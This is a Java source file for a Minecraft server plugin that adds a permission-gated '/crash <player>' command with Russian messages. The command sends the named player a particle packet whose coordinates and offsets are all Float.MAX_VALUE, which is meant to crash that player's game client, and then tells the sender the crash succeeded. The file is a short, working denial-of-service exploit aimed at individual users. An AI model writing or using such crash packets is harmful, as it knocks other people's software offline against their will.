package vsauko.mineplayapi.api.command.impl;

import com.comphenix.protocol.wrappers.EnumWrappers.Particle;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import vsauko.mineplayapi.api.command.BaseCommand;
import vsauko.mineplayapi.api.command.annotation.CommandPermission;
import vsauko.mineplayapi.api.protocollib.packet.world.WrapperPlayServerWorldParticles;

@CommandPermission(permission = "mineplayapi.crash")
public class CrashCommand extends BaseCommand<Player> {

    public CrashCommand() {
        super("crash");
    }

    @Override
    protected void onExecute(Player player, String[] args) {

        if (args.length < 1) {
            player.sendMessage("§aMine§7Play §8| §7Используйте `/crash` команду следующим образом:");
            player.sendMessage("§d  /crash <Имя_игрока>");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);

        if (target == null) {
            player.sendMessage("§aMine§7Play §8| §7Игрок оффлайн");
            return;
        }

        if (target.hasPermission("mineplayapi.crash.bypass")) {
            player.sendMessage("§aMine§7Play §8| §7У игрока иммунитет");
            return;
        }

        WrapperPlayServerWorldParticles wrapperPlayServerWorldParticles = new WrapperPlayServerWorldParticles();
        wrapperPlayServerWorldParticles.setParticleType(Particle.CLOUD);
        wrapperPlayServerWorldParticles.setX(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.setY(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.setZ(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.setOffsetX(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.setOffsetY(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.setOffsetZ(Float.MAX_VALUE);
        wrapperPlayServerWorldParticles.sendPacket(target);

        target.playSound(target.getLocation(), Sound.ENTITY_IRONGOLEM_ATTACK, 1.0F, 1.0F);
        target.playSound(target.getLocation(), Sound.ENTITY_PLAYER_ATTACK_CRIT, 1.0F, 1.0F);
        target.playSound(target.getLocation(), Sound.ENTITY_CREEPER_DEATH, 1.0F, 1.0F);

        player.sendMessage("§aMine§7Play §8| §7Игрок " + target.getName() + " был успешно крашнут");
    }
}